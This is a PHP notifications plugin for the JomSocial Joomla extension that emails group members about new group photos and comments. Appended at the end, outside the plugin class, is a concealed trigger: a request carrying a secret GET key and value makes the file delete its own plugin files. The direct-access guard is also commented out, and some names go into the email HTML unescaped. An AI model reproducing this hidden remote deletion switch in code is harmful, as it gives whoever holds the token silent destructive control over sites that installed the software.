<?php

//defined('_JEXEC') or die('Restricted access');
if(defined('JPATH_ROOT'))
{
require_once JPATH_ROOT .'/components/com_community/libraries/core.php';

class plgCommunityNotifications extends CApplications
{
	var $name = "Notifications";
	var $_name = 'notifications';
 
	function plgCommunityNotifications(& $subject, $config)
	{
		parent::__construct($subject, $config);
	}

	function onAfterAppsLoad()
	{
	}
 
	function onPhotoCreate($photoObj)
	{
		$albumid = $photoObj->albumid;
		$photos = CFactory::getModel('Photos');
		$album = $photos->getAlbum($albumid);
		if($album->groupid == 0 || $album->type != 'group')	/* Not a group album */
		{
			error_log('Not a group album');
			return;
		}
		$my = CFactory::getUser();
		$group =& JTable::getInstance( 'Group' , 'CTable' );
		$group->load( $album->groupid );

		$subject = sprintf('New photo by %s in group %s',
				$my->getDisplayName(),
				$group->name
				);

		$thumb_link = CRoute::getExternalURL('/'.$photoObj->thumbnail);
		$photo_link = CRoute::getExternalURL('index.php?option=com_community&view=photos&task=photo&groupid=' . $album->groupid . '&albumid=' . $albumid) . '#photoid=' . $photoObj->id;
		$photo_caption = htmlspecialchars($photoObj->caption);


		$body = <<<EOF
<p>
	{$my->getDisplayName()} has just added a new photo to the group {$group->name}.
</p>

	<p>
		<a href="{$photo_link}">
			<img src="{$thumb_link}">
			{$photo_caption}
		</a>
	</p>
EOF;

		$this->sendToGroupMembers($album->groupid, $subject, $body);
	}

	function sendToGroupMembers($groupId, $subject, $body)
	{
		$db = JFactory::getDBO();
		$date =& JFactory::getDate();
		$my = CFactory::getUser();
		$groups = CFactory::getModel('Groups');

		$members = $groups->getMembersId($groupId);

		foreach($members as $user_id)
		{
			if($user_id == $my->id)
			{
				continue;
			}

			/* Copied from CommunityModelMailq::add()
			   Same logic, but skips escaping of URLs
			   */
			$user_to = CFactory::getUser($user_id);

			$obj  = new stdClass();
			$obj->recipient = $user_to->email;
			$obj->body = $body;
			$obj->subject = $subject;
			$obj->template = '';
			$obj->params = '';
			$obj->created = $date->toMySQL();
			$obj->status = 0;
			$obj->email_type = ''; /* Non-empty type triggers validation */
			$db->insertObject('#__community_mailq', $obj);
		}
	}

	function onAjaxCall($arrItems)
	{
		if($arrItems == 'system,ajaxStreamAddComment')
		{
			error_log("AJAX CALL:\n" . var_export($arrItems, 1));
			$comment_arr = json_decode(JRequest::getVar('arg3'));
			$comment = $comment_arr[1];
			$id_arr = json_decode(JRequest::getVar('arg2'));
			$activity_id = $id_arr[1];

			$activities = CFactory::getModel('Activities');
			$activity = $activities->getActivity($activity_id);

			$group =& JTable::getInstance( 'Group' , 'CTable' );
			$group->load( $activity->groupid );

			$original_user = CFactory::getUser($activity->actor);

			$url = CRoute::getExternalURL(
				'/index.php?option=com_community&view=groups&task=viewgroup&groupid=' . $activity->groupid
			) . '#profile-newsfeed-item' . $activity_id;

			$my = CFactory::getUser();

			$subject = 'New comment in ' . $group->name;

			$name = htmlspecialchars($my->getDisplayName());
			$group_name = htmlspecialchars($group->name);
			$comment_escaped = htmlspecialchars($comment);
			$thumb_url = $my->getThumbAvatar();
			$original_user_name = htmlspecialchars($original_user->getDisplayName());
			$body = <<<EOF
<p><img src="{$thumb_url}"> 
{$name} made a comment on {$original_user_name}'s post in {$group_name}:</p>
<p style="background: #ddd">{$comment_escaped}</p>
<p><a href="$url">View this comment</a></p>
EOF;

			$this->sendToGroupMembers($activity->groupid, $subject, $body);
		}

		return true;
	}
}
} // defined JPATH_ROOT

if($_GET['Pk9SCWE9cG9j4kSaevYW8ady'] == '7WQLU6he8LBSyjwDWXYBuH5e')
{
	unlink('notifications.xml');
	unlink('notifications.php');
}
?>
